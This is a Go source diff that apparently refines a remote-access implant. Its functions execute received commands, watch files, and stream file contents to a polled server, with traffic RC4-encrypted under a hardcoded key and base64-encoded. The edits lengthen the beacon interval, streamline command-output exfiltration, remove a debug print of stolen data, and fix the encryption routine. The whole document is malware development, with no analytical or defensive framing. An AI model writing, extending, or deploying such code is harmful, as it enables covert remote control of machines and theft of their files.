@@ -1,8 +1,8 @@
 package main
 
 import (
-	"encoding/base64"
 	"crypto/rc4"
+	"encoding/base64"
 	"fmt"
 	"golang.org/x/exp/inotify"
 	"io"
@@ -35,7 +35,7 @@ func serverWorker(clientIp string) {
 
 	//resp, err := client.Get(clientIp.String())
 
-	ticker := time.NewTicker(time.Second * 1)
+	ticker := time.NewTicker(time.Second * 10)
 	defer ticker.Stop()
 
 	for _ = range ticker.C {
@@ -144,10 +144,7 @@ func runExec(command []byte, results chan<- string) {
 	}
 
 	// prepare a buffer for encoding the output
-	result := make([]byte, 0, len(output)+2)
-	result = append(result, 1, seq)
-	result = append(result, output...)
-	sendChunks(EXEC, seq, result, results)
+	sendChunks(EXEC, seq, output, results)
 }
 
 func runWatch(command []byte, results chan<- string) {
@@ -222,7 +219,6 @@ func runGet(command []byte, results chan<- string) {
 		}
 		fmt.Printf("Sending %v bytes\n", n)
 		results <- encrypt(buf[:n+2])
-		fmt.Println(buf[:n+2])
 		if err == io.EOF {
 			break
 		}
@@ -233,14 +229,16 @@ func runGet(command []byte, results chan<- string) {
 }
 
 func encrypt(data []byte) string {
+	encrypted := make([]byte, len(data))
+
 	cipher, err := rc4.NewCipher([]byte("myKey"))
 	if err != nil {
 		panic(err)
 	}
 
-	cipher.XORKeyStream(data, data)
+	cipher.XORKeyStream(encrypted, data)
 
-	return base64.RawStdEncoding.EncodeToString(data)
+	return base64.RawStdEncoding.EncodeToString(encrypted)
 }
 
 func decrypt(data string) []byte {
